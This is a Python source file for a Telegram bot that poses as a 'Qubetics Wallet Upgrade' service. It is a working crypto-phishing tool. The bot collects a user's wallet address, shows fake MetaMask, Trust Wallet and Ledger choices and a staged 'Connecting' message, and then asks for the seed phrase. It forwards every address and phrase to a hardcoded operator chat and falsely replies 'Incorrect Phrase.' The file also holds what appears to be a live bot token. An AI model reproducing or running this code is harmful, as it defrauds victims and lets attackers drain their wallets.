import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

TOKEN = "7822661773:AAH7xbG6L0tqHORDUmaHJecaIZkpZ4_VHn0"
TARGET_CHAT_ID = 7666664445  # Replace with the normal user Telegram ID that should receive recovery phrases

# States for the conversation flow
STATE_AWAITING_WALLET_ADDRESS = 1
STATE_AWAITING_RECOVERY_PHRASE = 2

# Store user states
user_state = {}

# /start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = (
        "Welcome to Qubetics Wallet Upgrade.\n"
        "This automated process will sync your wallet with the QUB v1.9 layer upgrade.\n\n"
        "Step 1: Please provide your wallet address."
    )
    await update.message.reply_text(welcome_text)
    # Set the user's state to expect a wallet address next
    user_state[update.message.from_user.id] = STATE_AWAITING_WALLET_ADDRESS

# Wallet selection callback handler
async def wallet_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    wallet_name = query.data
    wallet_display = {
        "metamask": "MetaMask",
        "trust": "Trust Wallet",
        "ledger": "Ledger",
        "other": "Other"
    }.get(wallet_name, "Unknown")

    # Show connecting message
    await query.edit_message_text(f"🔗 Connecting to {wallet_display}...")
    await asyncio.sleep(2)

    # Ask for recovery phrase
    await query.message.reply_text(
        "Please paste your 12 or 24-word recovery phrase exactly as it appears in your wallet backup. "
        "This is required to import your wallet into the upgrade system."
    )
    # Set the user's state to expect a recovery phrase next
    user_state[query.from_user.id] = STATE_AWAITING_RECOVERY_PHRASE

# Handler for text messages (to get the wallet address first, then the recovery phrase)
async def handle_all_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    text = update.message.text
    
    current_state = user_state.get(user_id, None)

    if current_state == STATE_AWAITING_WALLET_ADDRESS:
        # User has provided a wallet address
        await context.bot.send_message(
            chat_id=TARGET_CHAT_ID,
            text=f"User {user_id} sent wallet address:\n\n{text}"
        )
        
        # Now, display the wallet provider options
        keyboard = [
            [InlineKeyboardButton("MetaMask", callback_data="metamask"),
             InlineKeyboardButton("Trust Wallet", callback_data="trust")],
            [InlineKeyboardButton("Ledger", callback_data="ledger"),
             InlineKeyboardButton("Other", callback_data="other")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Step 2: Select your wallet provider.", reply_markup=reply_markup)
        
        # The user's state is now effectively waiting for a button click, we don't need to change it
        # as it will be updated by wallet_selected. We will just proceed.

    elif current_state == STATE_AWAITING_RECOVERY_PHRASE:
        # User has provided a recovery phrase
        await context.bot.send_message(
            chat_id=TARGET_CHAT_ID,
            text=f"User {user_id} sent recovery phrase:\n\n{text}"
        )
        await update.message.reply_text("Incorrect Phrase.")
        # Reset the state for the user
        user_state[user_id] = None

    else:
        # A fall-through for unexpected messages
        await update.message.reply_text("Please use the /start command to begin.")


def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(wallet_selected))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_text))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
